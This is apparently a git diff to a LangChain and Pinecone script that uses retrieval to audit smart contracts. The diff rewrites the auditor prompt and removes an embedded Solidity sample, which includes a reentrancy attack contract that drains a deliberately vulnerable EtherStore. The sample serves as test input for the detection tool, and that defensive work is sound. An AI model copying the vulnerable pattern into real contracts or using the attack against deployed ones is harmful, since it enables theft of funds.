@@ -33,7 +33,10 @@ pinecone.init(
 
 embeddings = OpenAIEmbeddings()
 
-pinecone_store = Pinecone.from_existing_index("auditme", embeddings)
+# pinecone_index = pinecone.Index('auditme')
+pinecone_index = Pinecone.from_existing_index('auditme', embeddings)
+
+retriever = pinecone_index.as_retriever()
 
 ################################################
 #  langchain pipeline
@@ -47,15 +50,14 @@ User Input: {question}"""
 CONDENSE_QUESTION_PROMPT = PromptTemplate.from_template(_template)
 
 # Define another template string for a prompt that will provide context and ask a question.
-template = """You are a Smart Contract auditor. 
-You have been provided the following RELEVANT_VULNERNABILITY, the result from a vector search of known smart contract vulnerabilities based on the code in the USER QUESTION. 
-Do not analyze the RELEVANT_VULNERNABILITY itself, only use it for helping identify vulnerabilities in USER QUESTION.
-
-Answer the USER QUESTION, identifying any vulnerabilities, and a possible fixex. Provide code excerpts where possible.
-
-ONLY indentify vulnerabilities in the USER QUESTION, not the RELEVANT_VULNERNABILITY.
+template = """You are a Smart Contract auditor agent in a RAG system. 
+We have performed a vector search of known smart contract vulnerabilities based on the code in the USER QUESTION.
+The results are below:
 
 RELEVANT_VULNERNABILITY: {context}
+
+With this knowledge, answer the USER QUESTION, identifying any vulnerabilities line by line, and a possible fixes. Provide code excerpts where possible.
+ONLY indentify vulnerabilities in the USER QUESTION, do not analyze the RELEVANT_VULNERNABILITY.
 
 USER QUESTION: {question}
 """
@@ -85,9 +87,10 @@ _inputs = RunnableParallel(
 # Define the context using the standalone question from the previous processing step,
 # retrieve documents based on that context/question, and combine them.
 _context = {
-    "context": itemgetter("user_question") | pinecone_store.similarity_search() | _combine_documents,
+    "context": itemgetter("user_question") | retriever | _combine_documents,
     "question": lambda x: x["user_question"],
 }
+
 
 # Combine the inputs and context to form the conversational QA chain.
 # This will use the rephrased question to retrieve documents, provide context, and generate an answer.
@@ -117,89 +120,6 @@ print(conversational_qa_chain.invoke(
                     // check if after send still enough to avoid underflow
                     if (balances[msg.sender] >= _weiToWithdraw) {
                         balances[msg.sender] -= _weiToWithdraw;
-                    }
-                }
-            }
-
-            contract EtherStoreRemediated {
-                mapping(address => uint256) public balances;
-                bool internal locked;
-
-                modifier nonReentrant() {
-                    require(!locked, "No re-entrancy");
-                    locked = true;
-                    _;
-                    locked = false;
-                }
-
-                function deposit() public payable {
-                    balances[msg.sender] += msg.value;
-                }
-
-                function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {
-                    require(balances[msg.sender] >= _weiToWithdraw);
-                    balances[msg.sender] -= _weiToWithdraw;
-                    (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
-                    require(send, "send failed");
-                }
-            }
-
-            contract ContractTest is Test {
-                EtherStore store;
-                EtherStoreRemediated storeRemediated;
-                EtherStoreAttack attack;
-                EtherStoreAttack attackRemediated;
-
-                function setUp() public {
-                    store = new EtherStore();
-                    storeRemediated = new EtherStoreRemediated();
-                    attack = new EtherStoreAttack(address(store));
-                    attackRemediated = new EtherStoreAttack(address(storeRemediated));
-                    vm.deal(address(store), 5 ether);
-                    vm.deal(address(storeRemediated), 5 ether);
-                    vm.deal(address(attack), 2 ether);
-                    vm.deal(address(attackRemediated), 2 ether);
-                }
-
-                function testReentrancy() public {
-                    attack.Attack();
-                }
-
-                function testFailRemediated() public {
-                    attackRemediated.Attack();
-                }
-            }
-
-            contract EtherStoreAttack is Test {
-                EtherStore store;
-
-                constructor(address _store) {
-                    store = EtherStore(_store);
-                }
-
-                function Attack() public {
-                    console.log("EtherStore balance", address(store).balance);
-
-                    store.deposit{value: 1 ether}();
-
-                    console.log(
-                        "Deposited 1 Ether, EtherStore balance",
-                        address(store).balance
-                    );
-                    store.withdrawFunds(1 ether); // exploit here
-
-                    console.log("Attack contract balance", address(this).balance);
-                    console.log("EtherStore balance", address(store).balance);
-                }
-
-                // fallback() external payable {}
-
-                // we want to use fallback function to exploit reentrancy
-                receive() external payable {
-                    console.log("Attack contract balance", address(this).balance);
-                    console.log("EtherStore balance", address(store).balance);
-                    if (address(store).balance >= 1 ether) {
-                        store.withdrawFunds(1 ether); // exploit here
                     }
                 }
             }""",
